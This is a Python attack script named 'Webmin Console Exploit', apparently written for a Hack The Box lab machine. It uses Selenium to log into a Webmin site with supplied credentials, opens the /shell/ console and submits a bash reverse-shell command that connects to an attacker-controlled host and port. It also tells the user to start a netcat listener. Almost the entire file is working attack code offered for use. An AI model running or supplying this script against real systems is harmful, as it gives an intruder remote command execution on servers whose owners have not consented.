#!/usr/bin/env python3

import sys
import subprocess
import time
import argparse
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import importlib.util

#install libaries if not installed
print("Installing necessary tools if not already installed")
package_name = 'colorama'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Colorama installed, not installing")
package_name = 'selenium'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Selenium installed, not installing")

#############################################################################################################################################

print(Fore.RED    +"  ____  __________    _      __    __   __  ____         _____                   __   ")
print(Fore.GREEN  +" / __ \/ ___/ ___/   | | /| / /__ / /  /  |/  (_)__     / ___/__  ___  ___ ___  / /__ ")
print(Fore.YELLOW +"/ /_/ / (_ / /__     | |/ |/ / -_) _ \/ /|_/ / / _ \   / /__/ _ \/ _ \(_-</ _ \/ / -_)")
print(Fore.MAGENTA+"\____/\___/\___/     |__/|__/\__/_.__/_/  /_/_/_//_/   \___/\___/_//_/___/\___/_/\__/ ")
print(Fore.RESET)

parser = argparse.ArgumentParser(description="Webmin Console Exploit", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t", "--Target", action="store", help="URL of Site with out the last /")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST (attacker IP)")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT (attacker listening port)")
parser.add_argument("-u", "--Username", action="store", help="Login Username")
parser.add_argument("-w", "--Password", action="store", help="Login Password")
args = parser.parse_args()

Target = args.Target
LHOST = args.LHOST
LPORT = args.LPORT
Username = args.Username
Password = args.Password

if (Target == None or LHOST == None or LPORT == None or Username == None or Password == None):
	print(Fore.YELLOW+"What do you want from me!!!"+Fore.RESET)
	parser.print_help()
	sys.exit()

Press_Enter = input(Fore.GREEN + "Sending Exploit, start NC listener with nc -lvnp "+LPORT+" please press enter to continue"+Fore.RESET)
# create webdriver object
driver = webdriver.Firefox()
driver.get(Target)
  
# get element (may need to change if not going against HTB Machine)
element_user = driver.find_element(By.NAME, 'user')
element_pass = driver.find_element(By.NAME, 'pass')

# send keys
element_user.send_keys(Username)
element_pass.send_keys(Password)
element_pass.submit()
time.sleep(7)
print(Fore.RED +"If you need to accept security risk, please accept and run script again"+Fore.RESET)

time.sleep(5)
new_url = (Target+"/shell/?xnavigation=1")
driver.get(new_url) 
time.sleep(5)
element_cmd = driver.find_element(By.NAME, 'cmd')
element_cmd.send_keys("bash -i >& /dev/tcp/"+LHOST+"/"+LPORT+" 0>&1")
element_cmd.submit()
